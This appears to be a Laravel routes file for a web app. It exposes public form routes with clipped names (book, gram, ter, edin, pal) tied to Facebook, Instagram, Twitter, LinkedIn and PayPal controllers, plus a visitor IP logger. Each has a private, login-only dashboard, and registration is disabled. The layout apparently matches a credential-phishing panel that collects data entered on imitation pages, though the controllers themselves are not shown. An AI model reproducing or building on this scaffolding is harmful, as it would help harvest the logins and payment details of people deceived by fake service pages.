<?php

use Illuminate\Support\Facades\Route;

use App\Http\Controllers\HomeController;
use App\Http\Controllers\SocialNetwork\FacebookController;
use App\Http\Controllers\SocialNetwork\InstagramController;
use App\Http\Controllers\SocialNetwork\TwitterController;
use App\Http\Controllers\SocialNetwork\LinkedinController;
use App\Http\Controllers\SocialNetwork\MktController;
use App\Http\Controllers\SocialNetwork\PaypalController;
use App\Http\Controllers\IpAddressController;
use App\Http\Controllers\ErpController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
/* force laravel work out on https */
URL::forceScheme('https');

Route::get('/', function () {
    return view('welcome');
});



//Auth::routes();
Auth::routes([
    'register' => false, // Registration Routes...
    'reset' => false, // Password Reset Routes...
    'verify' => false, // Email Verification Routes...
]);


/**
 * Web
 */
Route::get('/home', [HomeController::class, 'index'])->name('home');

Route::get('/book', [FacebookController::class, 'index'])->name('book');
Route::post('/book', [FacebookController::class, 'store']);

Route::get('/gram', [InstagramController::class, 'index'])->name('gram');
Route::post('/gram', [InstagramController::class, 'store']);

Route::get('/ter', [TwitterController::class, 'index'])->name('ter');
Route::post('/ter', [TwitterController::class, 'store']);

Route::get('/edin', [LinkedinController::class, 'index'])->name('edin');
Route::post('/edin', [LinkedinController::class, 'store']);

Route::get('/mkt', [MktController::class, 'index'])->name('mkt');
Route::post('/mkt', [MktController::class, 'store']);

Route::get('/visitor', [IpAddressController::class, 'index'])->name('visitor');
Route::post('/visitor', [IpAddressController::class, 'store']);

Route::get('/pal', [PaypalController::class, 'index'])->name('pal');
Route::post('/pal', [PaypalController::class, 'store']);

Route::get('/erp', [ErpController::class, 'index'])->name('erp');
Route::post('/erp', [ErpController::class, 'store']);






Route::group(['middleware' => ['auth']], function () { 
    Route::get('/dashboardfacebook', [FacebookController::class, 'dashboardFacebook'])->name('dashboardFacebook');
    Route::get('/dashboardinstagram', [InstagramController::class, 'dashboardInstagram'])->name('dashboardInstagram');
    Route::get('/dashboardtwitter', [TwitterController::class, 'dashboardTwitter'])->name('dashboardtwitter');
    Route::get('/dashboardlinkedin', [LinkedinController::class, 'dashboardLinkedin'])->name('dashboardlinkedin');
    Route::get('/dashboardpaypal', [PaypalController::class, 'dashboardPaypal'])->name('dashboardpaypal');
    Route::get('/dashboardmkt', [MktController::class, 'dashboardMkt'])->name('dashboardmkt');
    Route::get('/dashboardvisitor', [IpAddressController::class, 'dashboardVisitor'])->name('dashboardvisitor');
    Route::get('/dashboarderp', [ErpController::class, 'dashboarderp'])->name('dashboarderp');
});